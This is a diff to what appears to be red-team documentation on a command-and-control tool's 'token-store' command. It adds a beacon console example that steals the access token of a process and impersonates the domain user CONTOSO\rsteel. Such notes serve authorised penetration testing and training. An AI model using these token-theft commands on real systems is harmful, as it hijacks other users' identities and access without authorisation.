@@ -54,9 +54,18 @@ The downside of the steal_token command is that if you drop impersonation and th
 The `token-store` of command is used to manage tokens, such as:
 
 - `token-store steal` to steal a token and add it to the store.
-    
 - `token-store show` to print the tokens in the store.
-    
 - `token-store use` to use a token in the store.
-    
 - `token-store remove` to remove a token from the store.
+
+```powershell
+beacon> token-store steal 5248
+[*] Stored Tokens
+
+ ID   PID   User
+ --   ---   ----
+ 0    5248  CONTOSO\rsteel
+ 
+beacon> token-store use 0
+[+] Impersonated CONTOSO\rsteel
+```
